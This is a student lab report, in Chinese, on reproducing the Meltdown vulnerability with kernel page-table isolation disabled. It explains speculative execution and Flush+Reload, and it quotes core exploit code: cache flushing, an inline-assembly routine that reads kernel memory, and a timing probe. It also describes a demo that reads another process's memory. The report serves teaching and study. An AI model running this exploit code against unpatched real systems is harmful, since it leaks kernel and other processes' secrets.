## Meltdown实验报告



#### 实验环境

- Ubuntu 16.04
- linux kernel version 4.13.0-45-generic
- 禁用PTI



#### 实验原理

主要参考Meltdown论文[1]， 谈谈自己的理解。

meltdown漏洞利用intel处理器的乱序执行的特点，基于cache进行侧信道攻击，实现对内存的越权访问。

- 乱序执行

乱序执行是指当CPU中的某些指令需要等待某些资源，比如内存读取时，CPU不会在当前指令停止，而是利用空闲的计算能力继续执行后续的指令。这大大地增加了计算能力的利用率，从而提升了CPU性能。看下面的一段代码：

```c
//代码来自meltdown论文[1]
raise_exception();
//the line below is never reached
access(probe_array[data*4096]);
```

在第一行我们引发了一个异常，若按照顺序执行，raise-exception后的代码不会被执行，因为程序由于exception已经被终止。但是由于不存在依赖，乱序执行会在异常引发之前将后面的代码先执行，执行结果存在ROB内不被提交，当异常引发后，access的执行结果会被撤销，仿佛它没有被执行过一样。然而，尽管乱序执行不会影响到memory内容，但是会影响cache状态。已经fetch的内容虽然不会被commit，但是已经存储在cache中！这也就给了我们攻击的机会。



- 侧信道攻击

侧信道攻击是指不去攻击信道本身来获得信息，而是通过观察信道双方通信时产生的其他影响，通过分析泄露的额外信息来建立映射，进而取得信息。

meltdown利用的侧信道为**cache中缓存的的page信息**，即攻击者可以获得这样的信息：**某一page是否在cache内**。

```asm
;代码来自meltdown论文[1]
;rcx = kernel address
;rbx = probe array
retry:
mov al, byte [rcx]
shl rax, 0xc
jz retry
mov rbx, qword [rbx + rax]
```

这段代码是攻击的核心部分，mov语句将保存在RCX寄存器中的目标内核地址内的数据存放到RAX寄存器中，并且进行权限检查，检查进程是否有权限访问该地址。因为用户态无权访问内核地址，这一条指令会引发异常，使得mov语句及其后面所有的语句的修改全部被抛弃。

但是因为权限检查是一种相对比较耗资源的工作，由于乱序执行和预测执行，后面的指令实际上会在权限检查结束前就已经执行过了，并且此时的计算是根据mov指令所读取到的数据所进行，并不受CPU权限限制。shl指令将会把这个数据乘以4096，并在下面的mov指令中将其作为offset来对数组probe array进行访问，这时rbx[al*4096]就会被载入cache。由于一个内存页的大小是4KB，不同的数据将会导致不同的内存页被访问并存放到cache中。

此后，另一个攻击者进程就可以通过cache侧信道攻击。cache攻击方式有Flush+Reload, Evict+Time和Prime+Probe. Meltdown**利用Flush+Reload来了解哪个内存页被访问过了**，从而推断出被访问的内核内存数据。

即利用CPU cache隐通道（covert channel)，将microarchitectural state转化architectural state，从cache变化中推断出register变化！具体来说，攻击者可以利用CPU加载某块地址空间的时间来推测这块内存最近是否被加载过，进而推测得到更多数据。例如，我们访问的是rbx[x * 4096]，不断遍历加载rbx[n * 4096], n从0到255，由于rbx[x * 4096]被cache了，则加载时间会远小于其他rbx[n * 4096]，这样我们就能够推测出x的值，进而得知RCX所指向的内核数据是n。



#### 攻击步骤

参考[2]的资料，我们结合这个程序来具体解释meltdown的攻击过程。

这个程序在用户态利用系统调用将linux_proc_banner变量的信息返回给应用程序，接着利用meltdown漏洞直接从用户态程序中访问linux_proc_banner变量，破坏memory isolation.

首先，在kernel command line中**添加nopti，reboot**。

接着gcc编译meltdown.c文件并run，运行run.sh, 其中利用了`sudo cat /proc/kallsyms`获取linux_proc_banner在内核内存中的位置。接下来具体分析meltdown.c文件的功能。

- Flush

  如实验原理中所述，meltdown利用Flush+Reload进行cache攻击。Flush阶段，通过clflush_target()函数，攻击者故意清除了target_array的缓存，为后面的reload作准备。

  ```c
  void clflush_target(void)
    {
    	int i;
    	for (i = 0; i < VARIANTS_READ; i++)
    	_mm_clflush(&target_array[i * TARGET_SIZE]); //	清除缓存
    }
  ```

  

- Speculate

  这一阶段利用汇编指令，触发异常，猜数据。

  ```c
  static void __attribute__((noinline))
  speculate(unsigned long addr)
  {
      asm volatile (
          "1:\n\t"
          ".rept 300\n\t"
          "add $0x141, %%rax\n\t"
          ".endr\n\t"
          "movzx (%[addr]), %%eax\n\t"	//这是在论文中出现的关键代码
          "shl $12, %%rax\n\t"			//在原理部分已说明
          "jz 1b\n\t"
          "movzx (%[target], %%rax, 1), %%rbx\n"
          "stopspeculate: \n\t"
          "nop\n\t"
          :
          : [target] "r" (target_array),
            [addr] "r" (addr)
          : "rax", "rbx"
      );
  }
  ```

  rept到endr是一段循环操作，使add语句的加法指令执行300次，这时为了测试处理器能乱序执行成功。

  接下来的movzx, shl, jz, movzx指令是论文中给出的关键代码，将addr上的数据读到eax寄存器中，引发处理器异常，接着shl指令为推测内核地址指向的数据作准备。

  虽然在实际情况下，执行到`"movzx (%[addr]), %%eax\n\t"`这一行的时候，CPU就会报出异常了，但因为推测执行的原因，随后的代码已经被执行了。虽然推测执行的结果会回滚，但是对cache的操作却是不可逆的。

  

- Reload

  `movzx (%[target], %%rax, 1), %%rbx\n`

  以目标内核地址指向的数据x * 4096为索引访问target数组，这时不同的数据会被加载到不同的缓存页面。这就是第一步里Flush后的Reload阶段。

  

- Probe

  ```c
  void check(void)
  {
  	int i, time, mix_i;
  	volatile char *addr;
      for (i = 0; i < VARIANTS_READ; i++) {
          mix_i = ((i * 167) + 13) & 255;
          addr = &target_array[mix_i * TARGET_SIZE];
          time = get_access_time(addr);
          if (time <= cache_hit_threshold)
              hist[mix_i]++;
      }
  }
  ```

  通过访问target里的数据的速度来判断哪个数据被放到了cache里，从而就能知道目标地址上的某一位数据是什么了。由于target的大小是256*4096，所以最多测试256次，就能推测出内核地址指向的数据中的**一个字节**是否被访问过。要推测内核地址指向的完整数据，就要不断**循环探测**。循环探测的代码比较简单，具体可见实验代码。

  

  

#### 期望结果

![实验结果](https://github.com/OSH-2018/4-hhhiddleston/blob/master/screenshot.png)





#### 进阶研究

由于我所学习的代码实现的功能比较局限，且鲁棒性不强，所以我又继续研究了Meltdown官方的库[3]，并利用他们的库做了一个更具展示性的demo。见[视频demo](https://github.com/OSH-2018/4-hhhiddleston/blob/master/my/demo.mp4)。

其中，loadimage.c是一个简单的读取ppm格式图片的程序，demo.c 实现的是对loadimage进程越权访问内存和进行图片重构。该部分代码存放在仓库的my文件夹里。






#### 思考

> 1. 该利用代码一次只能探测一个字节的数据，如果在内核数据还没读取完整之前处理器已经处理异常了该怎么办？

​	这点meltdown论文里有所提及，它指出了两种方法。

​	一是exception handling：执行暂时指令后catch exception。

​	二是exception suppression：抑制exception发生，将控制流重定位。



> 2. 探测数组target_array是否可以不用设置成256 * 4KB，设置成512 * 2KB，1024*1KB效果会如何？

​	理论上只要探测数组可以探测256个page，就可以实现meltdown越权访存，但是如果不使用256 * 4KB的探测数组，则不可以简单地使用cache命中的page number作为一个byte的值。





参考文献：

[1]Moritz Lipp, Michael Schwarz, Daniel Gruss, Thoma Prescher, Wenner Haas. Meltdown.On https://meltdownattack.com/ (2018)

[2]https://github.com/paboldin/meltdown-exploit

[3]https://github.com/IAIK/meltdown

[4]https://gitee.com/idea4good/meltdown







